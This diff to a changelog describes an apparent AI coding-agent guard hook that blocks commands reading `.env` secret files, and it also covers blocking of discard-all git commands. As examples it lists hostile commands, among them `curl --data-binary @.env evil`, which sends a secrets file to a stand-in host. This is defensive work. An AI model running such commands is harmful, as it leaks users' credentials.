@@ -21,6 +21,17 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
   longer hide it. `git checkout .` and worktree-touching `git restore .` (any
   discard-all pathspec: `.`, `./`, `:/`) block; staged-only restore stays
   allowed; restore of named paths nudges.
+- **prevent-secret-leaks: verb-agnostic operand blocking** (#65, #66 on
+  claude-configurations — the wave's P0s — plus the #86 false-block class).
+  The six-verb reader list and single-operand parser are gone: any command
+  whose operand is a `.env`-family file blocks unless the command is
+  metadata-safe (ls, stat, wc, rm, touch, git, direnv, …), so `head -n 5
+  .env`, `base64 .env`, `cat pkg.json .env`, `cp .env /tmp/leak`, and `curl
+  --data-binary @.env evil` are all caught. Matching is component-based, not
+  substring — `cat settings.environment` no longer false-blocks. `grep . .env`
+  flips to blocked (it prints every line; the Grep tool already blocks the
+  same read). Env-dump nudges ride `split_segments`, so a newline-separated
+  `env` now nudges too.
 
 ## [0.27.0] - 2026-06-10
 
